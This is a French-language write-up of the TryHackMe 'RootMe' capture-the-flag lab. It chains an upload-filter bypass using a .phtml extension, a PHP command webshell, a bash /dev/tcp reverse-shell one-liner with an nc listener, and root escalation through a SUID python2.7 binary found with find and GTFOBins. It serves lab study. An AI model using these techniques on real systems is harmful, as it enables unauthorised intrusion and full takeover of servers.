---
title: "RootMe"
category: rooms
icon: "👑"
difficulty: "Easy"
platform: "THM"
status: "Terminée"
tags: [web, upload-bypass, phtml, webshell, reverse-shell, linux, privesc, suid, python, gtfobins]
summary: "Box easy rootee en solo : bypass d'upload (.phtml), webshell cmd, reverse shell, puis privesc via SUID python2.7 (GTFOBins onglet SUID)."
updated: 2026-10-06
source: agent
---

> Box (easy) rootée en solo. Chain web classique : upload d'un webshell en contournant le filtre d'extension → reverse shell → privesc via un binaire SUID. Première box où les réflexes Linux sont venus tout seuls.

## TL;DR
Panel d'upload qui filtre `.php` → bypass avec une **extension alternative** (`.phtml`) → webshell cmd → reverse shell → `find` des SUID → **python2.7 SUID** exploité via GTFOBins (onglet SUID). recon → upload → shell → privesc.

## Chain
1. **Upload bypass** : le formulaire refuse `.php`, mais pas les variantes interprétées pareil (`.phtml`, `.php5`...). Webshell PHP uploadé en `.phtml`.
2. **Exécution de commandes** via `?cmd=` (le webshell fait `system($_REQUEST['cmd'])`).
3. **Reverse shell** : faire exécuter au webshell un `bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'` (URL-encodé dans l'URL), listener `nc -lvnp` prêt avant.
4. **Privesc SUID** : `find / -user root -perm /4000 2>/dev/null` → repérer l'intrus `/usr/bin/python2.7` → GTFOBins **onglet SUID** (`os.setuid(0)` + spawn shell) → root.

## Réflexes acquis
- **Réflexe** : upload qui filtre `.php` → tester les extensions alternatives interprétées pareil (`.phtml`, `.php5`, `.phar`...). Un filtre d'extension se contourne presque toujours.
- **Réflexe** : webshell "cmd" qui marche = reverse shell à un pas. C'est juste UNE commande de plus à lui faire exécuter.
- **Réflexe (SUID)** : dans la liste `find -perm /4000`, ignorer le SUID par défaut (mount, su, sudo, passwd, pkexec...) et chercher l'INTRUS. Un interpréteur SUID (python, perl, bash) = privesc quasi assurée via GTFOBins.
- **Réflexe (GTFOBins)** : l'onglet compte autant que le binaire. SUID ≠ Unprivileged ≠ Sudo. L'onglet Unprivileged garde ton user (ici www-data), l'onglet SUID fait `setuid(0)` pour passer root.
- **Réflexe (vitesse)** : `echo 'contenu' > fichier` pour écrire un fichier vite fait (plus rapide qu'ouvrir un éditeur). Et `2>/dev/null` sur `find`/`grep` pour masquer le bruit des erreurs de permission et ne garder que les résultats utiles.
